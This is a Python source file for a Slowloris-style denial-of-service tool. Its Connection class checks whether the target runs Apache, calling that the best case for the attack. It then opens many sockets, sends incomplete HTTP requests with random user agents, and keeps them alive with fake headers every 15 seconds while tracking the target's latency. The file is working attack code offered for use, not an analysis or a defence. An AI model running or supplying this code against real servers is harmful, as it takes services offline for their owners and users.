import socket
import user_agent as ua
from target import Target
import random
import latency
import sys
import time
import logging
import requests
class Connection:

    sockets_list = []
    log = logging.getLogger(__name__)
    def __init__(self,target_info):
        self.target_info : Target = target_info

    def retrieve_ws(self):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(3)
        try:
            sock.connect((self.target_info.host, self.target_info.port))
            sock.send("GET / HTTP/1.1\r\n\r\n".encode("ascii"))
            response = sock.recv(1024).decode("utf-8")
            sock.shutdown(1)
            sock.close()
        except: 
            self.log.warning("No Webserver detected, please verify your target adresse")
            sys.exit()
            return None
        for line in response.split("\r\n"):
            if line.startswith("Server:"):
                ws = line.split("Server:")[1].strip()
                if ws.startswith("Apache"):
                    self.log.info("[{}] server running with Apache, best configuartion for this attack".format(self.target_info.host))
                else:
                    self.log.info("[{}] serveur running with {} , Not best configuration".format(self.target_info.host,ws))
        return None
    
    def init_socks(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(4)
        s.connect((self.target_info.host, self.target_info.port))

        s.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)).encode("utf-8"))
        s.send("User-Agent: {}\r\n".format(ua.USER_AGENTS[random.randint(0,29)]).encode("utf-8"))
        s.send("{}\r\n".format("Accept-language: en-US,en,q=0.5").encode("utf-8"))
        self.log.debug(s)
        return s

    def test_initial_latency(self,latence):
        response = requests.get(latence.url).elapsed.total_seconds()
        self.target_info.latency = response


    def start_attack(self):
        latence = latency.Latency(self.target_info)
        latence.start()

        for _ in range(self.target_info.sockets_number):
            try:
                s = self.init_socks()
            except socket.error as e:
                self.log.warning(e)
                break
            self.sockets_list.append(s)
            self.log.debug("Added new socket connection")
        self.log.info("{} connections {} initialised".format(len(self.sockets_list),self.target_info.sockets_number))
        while True:
            try:
                self.log.info("Sending header with {} sockets".format(len(self.sockets_list)))
                for s in list(self.sockets_list):
                    try:
                        s.send("X-a: {}\r\n".format(random.randint(1, 5000)).encode("utf-8"))
                    except socket.error:
                        self.sockets_list.remove(s)
                self.log.info("try recreating sockets")
                for _ in range(self.target_info.sockets_number - len(self.sockets_list)):
                    try:
                        s = self.init_socks()
                        if s:
                            self.sockets_list.append(s)
                    except socket.error as e:
                        self.log.warning(e)
                        break
                self.log.info("{} connections {} initialised".format(len(self.sockets_list),self.target_info.sockets_number))
                if not latence.is_alive():
                    latence.run()
                time.sleep(15)

            except (KeyboardInterrupt, SystemExit):
                self.log.info("Stopping Slowloris")
                avg = latence.get_average()
                self.log.info("Average latency = {}".format(avg))
                break